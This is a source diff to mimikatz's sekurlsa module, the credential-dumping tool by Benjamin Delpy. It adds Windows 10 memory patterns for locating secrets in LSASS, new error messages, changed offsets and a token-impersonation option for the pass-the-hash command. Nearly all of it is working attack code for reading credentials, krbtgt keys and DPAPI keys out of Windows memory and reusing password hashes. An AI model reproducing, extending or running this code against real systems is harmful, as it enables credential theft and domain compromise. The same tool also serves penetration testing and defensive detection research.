@@ -1,7 +1,7 @@
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
-	Licence : http://creativecommons.org/licenses/by/3.0/fr/
+	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_sekurlsa.h"
 
@@ -181,7 +181,7 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 							cLsass.osContext.MinorVersion = pInfos->MinorVersion;
 							cLsass.osContext.BuildNumber  = pInfos->BuildNumber;
 
-							if(isError = (cLsass.osContext.MajorVersion != MIMIKATZ_NT_MAJOR_VERSION) && !(MIMIKATZ_NT_MAJOR_VERSION >= 6 && cLsass.osContext.MajorVersion == 10))
+							if(isError = (cLsass.osContext.MajorVersion != MIMIKATZ_NT_MAJOR_VERSION) && !(MIMIKATZ_NT_MAJOR_VERSION >= 6 && cLsass.osContext.MajorVersion >= 6))
 								PRINT_ERROR(L"Minidump pInfos->MajorVersion (%u) != MIMIKATZ_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, MIMIKATZ_NT_MAJOR_VERSION);
 						#ifdef _M_X64
 							else if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64))
@@ -416,6 +416,7 @@ KULL_M_PATCH_GENERIC SecDataReferences[] = {
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W2K8_SecData),		PTRN_W2K8_SecData},		{0, NULL}, { 11, 39}},
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_W2K12_SecData),	PTRN_W2K12_SecData},	{0, NULL}, { 10, 39}},
 	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, {-12, 39}},
+	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, { -9, 39}},
 };
 #elif defined _M_IX86
 BYTE PTRN_W2K3_SecData[]	= {0x53, 0x56, 0x8d, 0x45, 0x98, 0x50, 0xb9};
@@ -446,6 +447,7 @@ NTSTATUS kuhl_m_sekurlsa_krbtgt(int argc, wchar_t * argv[])
 					kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_previous, L"Previous");
 				}
 			}
+			else PRINT_ERROR(L"Unable to find KDC pattern in LSASS memory\n");
 		}
 		else PRINT_ERROR(L"KDC service not in LSASS memory\n");
 	}
@@ -596,6 +598,7 @@ NTSTATUS kuhl_m_sekurlsa_dpapi_system(int argc, wchar_t * argv[])
 					else PRINT_ERROR(L"Not initialized!\n");
 				}
 			}
+			else PRINT_ERROR(L"Pattern not found in DPAPI service\n");
 		}
 		else PRINT_ERROR(L"DPAPI service not in LSASS memory\n");
 	}
@@ -607,7 +610,7 @@ BYTE PTRN_W2K8R2_DomainList[]	= {0xf3, 0x0f, 0x6f, 0x6c, 0x24, 0x30, 0xf3, 0x0f,
 BYTE PTRN_W2K12R2_DomainList[]	= {0x0f, 0x10, 0x45, 0xf0, 0x66, 0x48, 0x0f, 0x7e, 0xc0, 0x0f, 0x11, 0x05};
 KULL_M_PATCH_GENERIC DomainListReferences[] = {
 	{KULL_M_WIN_BUILD_7,	{sizeof(PTRN_W2K8R2_DomainList),		PTRN_W2K8R2_DomainList},	{0, NULL}, {10}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_DomainList),	PTRN_W2K12R2_DomainList},	{0, NULL}, {12}},
+	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_DomainList),	PTRN_W2K12R2_DomainList},	{0, NULL}, {8}},
 };
 NTSTATUS kuhl_m_sekurlsa_trust(int argc, wchar_t * argv[])
 {
@@ -640,6 +643,7 @@ NTSTATUS kuhl_m_sekurlsa_trust(int argc, wchar_t * argv[])
 						}
 					}
 				}
+				else PRINT_ERROR(L"Pattern not found in KDC service\n");
 			}
 			else PRINT_ERROR(L"KDC service not in LSASS memory\n");
 		}
@@ -753,6 +757,7 @@ void kuhl_m_sekurlsa_bkey(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB 
 			}
 		}
 	}
+	else PRINT_ERROR(L"Pattern not found in DPAPI service\n");
 }
 
 BYTE PTRN_WALL_BackupKey[]			= {0xb9, 0x02, 0x00, 0x00, 0x00, 0x89, 0x05};
@@ -802,15 +807,20 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 	SEKURLSA_PTH_DATA data = {&tokenStats.AuthenticationId, NULL, NULL, NULL, FALSE};
 	PCWCHAR szUser, szDomain, szRun, szNTLM, szAes128, szAes256;
 	DWORD dwNeededSize;
-	HANDLE hToken;
+	HANDLE hToken, hNewToken;
 	PROCESS_INFORMATION processInfos;
+	BOOL isImpersonate;
 
 	if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
 	{
 		if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
 		{
-			kull_m_string_args_byName(argc, argv, L"run", &szRun, L"cmd.exe");
-			kprintf(L"user\t: %s\ndomain\t: %s\nprogram\t: %s\n", szUser, szDomain, szRun);
+			isImpersonate = kull_m_string_args_byName(argc, argv, L"impersonate", NULL, NULL);
+#pragma warning(push)
+#pragma warning(disable:4996)			
+			kull_m_string_args_byName(argc, argv, L"run", &szRun, isImpersonate ? _wpgmptr : L"cmd.exe");
+#pragma warning(pop)
+			kprintf(L"user\t: %s\ndomain\t: %s\nprogram\t: %s\nimpers.\t: %s\n", szUser, szDomain, szRun, isImpersonate ? L"yes" : L"no");
 
 			if(kull_m_string_args_byName(argc, argv, L"aes128", &szAes128, NULL))
 			{
@@ -847,7 +857,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 					data.NtlmHash = ntlm;
 					kprintf(L"NTLM\t: "); kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
 				}
-				else PRINT_ERROR(L"ntlm hash length must be 32 (16 bytes)\n");
+				else PRINT_ERROR(L"ntlm hash/rc4 key length must be 32 (16 bytes)\n");
 			}
 						
 			if(data.NtlmHash || data.Aes128Key || data.Aes256Key)
@@ -855,7 +865,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 				if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L"", &processInfos, FALSE))
 				{
 					kprintf(L"  |  PID  %u\n  |  TID  %u\n",processInfos.dwProcessId, processInfos.dwThreadId);
-					if(OpenProcessToken(processInfos.hProcess, TOKEN_READ, &hToken))
+					if(OpenProcessToken(processInfos.hProcess, TOKEN_READ | (isImpersonate ? TOKEN_DUPLICATE : 0), &hToken))
 					{
 						if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
 						{
@@ -866,23 +876,35 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 							kprintf(L"  \\_ kerberos - ");
 							kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_pth, &data);
 							kprintf(L"\n");
+
+							if(data.isReplaceOk)
+							{
+								if(isImpersonate)
+								{
+									if(DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityDelegation, TokenImpersonation, &hNewToken))
+									{
+										if(SetThreadToken(NULL, hNewToken))
+											kprintf(L"** Token Impersonation **\n");
+										else PRINT_ERROR_AUTO(L"SetThreadToken");
+										CloseHandle(hNewToken);
+									}
+									else PRINT_ERROR_AUTO(L"DuplicateTokenEx");
+									NtTerminateProcess(processInfos.hProcess, STATUS_SUCCESS);
+								}
+								else NtResumeProcess(processInfos.hProcess);
+							}
+							else NtTerminateProcess(processInfos.hProcess, STATUS_FATAL_APP_EXIT);
 						}
 						else PRINT_ERROR_AUTO(L"GetTokenInformation");
 						CloseHandle(hToken);
 					}
 					else PRINT_ERROR_AUTO(L"OpenProcessToken");
-
-					if(data.isReplaceOk)
-						NtResumeProcess(processInfos.hProcess);
-					else
-						NtTerminateProcess(processInfos.hProcess, STATUS_FATAL_APP_EXIT);
-
 					CloseHandle(processInfos.hThread);
 					CloseHandle(processInfos.hProcess);
 				}
 				else PRINT_ERROR_AUTO(L"CreateProcessWithLogonW");
 			}
-			else PRINT_ERROR(L"Missing at least one argument : ntlm OR aes128 OR aes256\n");
+			else PRINT_ERROR(L"Missing at least one argument : ntlm/rc4 OR aes128 OR aes256\n");
 		}
 		else PRINT_ERROR(L"Missing argument : domain\n");
 	}
@@ -970,7 +992,7 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 							kuhl_m_dpapi_oe_credential_add(sid, NULL, pPrimaryCreds10->isNtOwfPassword ? pPrimaryCreds10->NtOwfPassword : NULL, pPrimaryCreds10->isShaOwPassword ? pPrimaryCreds10->ShaOwPassword : NULL, NULL, NULL);
 					}
 					else
-						kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) ((PBYTE) pPrimaryCreds10 + FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, align0) + sizeof(USHORT)));
+						kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) ((PBYTE) pPrimaryCreds10 + FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, NtOwfPassword) + sizeof(USHORT)));
 					break;
 				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
 					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) credentials->Buffer;
@@ -1000,14 +1022,14 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 			if(mesCreds->Domaine.Buffer)
 			{
 				kprintf(
-					L"\n\t     Model    : %s"
+					L"\n\t     Card     : %s"
 					L"\n\t     Reader   : %s"
-					L"\n\t     Key name : %s"
+					L"\n\t     Container: %s"
 					L"\n\t     Provider : %s",
-					(PBYTE) mesCreds->Domaine.Buffer + sizeof(KIWI_KERBEROS_CSP_NAMES) + sizeof(wchar_t) * ((PKIWI_KERBEROS_CSP_NAMES) mesCreds->Domaine.Buffer)->offsetToCard,
-					(PBYTE) mesCreds->Domaine.Buffer + sizeof(KIWI_KERBEROS_CSP_NAMES) + sizeof(wchar_t) * ((PKIWI_KERBEROS_CSP_NAMES) mesCreds->Domaine.Buffer)->offsetToReader,
-					(PBYTE) mesCreds->Domaine.Buffer + sizeof(KIWI_KERBEROS_CSP_NAMES) + sizeof(wchar_t) * ((PKIWI_KERBEROS_CSP_NAMES) mesCreds->Domaine.Buffer)->offsetToSerial,
-					(PBYTE) mesCreds->Domaine.Buffer + sizeof(KIWI_KERBEROS_CSP_NAMES) + sizeof(wchar_t) * ((PKIWI_KERBEROS_CSP_NAMES) mesCreds->Domaine.Buffer)->offsetToProvider
+					(PBYTE) mesCreds->Domaine.Buffer + 4 * sizeof(DWORD) + sizeof(wchar_t) * ((PDWORD) mesCreds->Domaine.Buffer)[0],
+					(PBYTE) mesCreds->Domaine.Buffer + 4 * sizeof(DWORD) + sizeof(wchar_t) * ((PDWORD) mesCreds->Domaine.Buffer)[1],
+					(PBYTE) mesCreds->Domaine.Buffer + 4 * sizeof(DWORD) + sizeof(wchar_t) * ((PDWORD) mesCreds->Domaine.Buffer)[2],
+					(PBYTE) mesCreds->Domaine.Buffer + 4 * sizeof(DWORD) + sizeof(wchar_t) * ((PDWORD) mesCreds->Domaine.Buffer)[3]
 					);
 			}
 		}
@@ -1142,7 +1164,7 @@ VOID kuhl_m_sekurlsa_genericLsaIsoOutput(PLSAISO_DATA_BLOB blob)
 	kprintf(L"\n\t   * LSA Isolated Data: %.*S", blob->typeSize, blob->data);
 	kprintf(L"\n\t     Unk-Key  : "); kull_m_string_wprintf_hex(blob->unkKeyData, 3*16, 0);
 	kprintf(L"\n\t     Encrypted: "); kull_m_string_wprintf_hex(blob->data + blob->typeSize, blob->origSize, 0);
-	//kprintf(L"\n\t\t   SS:%u, TS:%u, DS:%u", blob->structSize, blob->typeSize, blob->origSize);
-	//kprintf(L"\n\t\t   0:0x%x, 1:0x%x, 2:0x%x, 3:0x%x, 4:0x%x, E:", blob->unk0, blob->unk1, blob->unk2, blob->unk3, blob->unk4);
-	//kull_m_string_wprintf_hex(blob->unkEmpty, 20, 0);
+	kprintf(L"\n\t\t   SS:%u, TS:%u, DS:%u", blob->structSize, blob->typeSize, blob->origSize);
+	kprintf(L"\n\t\t   0:0x%x, 1:0x%x, 2:0x%x, 3:0x%x, 4:0x%x, E:", blob->unk0, blob->unk1, blob->unk2, blob->unk3, blob->unk4);
+	kull_m_string_wprintf_hex(blob->unkData2, sizeof(blob->unkData2), 0); kprintf(L", 5:0x%x", blob->unk5);
 }
